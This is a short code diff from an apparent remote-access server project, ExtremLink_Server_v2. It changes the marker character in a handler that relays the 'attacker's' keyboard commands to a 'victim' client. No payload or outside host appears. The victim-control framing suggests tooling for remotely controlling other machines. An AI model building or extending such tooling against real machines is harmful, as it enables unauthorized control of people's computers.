@@ -373,7 +373,7 @@ namespace ExtremLink_Server_v2.Classes
         {
             // Input: A string which represents a message about keyboard commands from the attacker.
             // Output: The function handles with the given message.
-            this.victim.SendTCPMessageToClient("⌨", data);
+            this.victim.SendTCPMessageToClient("^", data);
         }
 
         // Handling Session info retrieve command function:
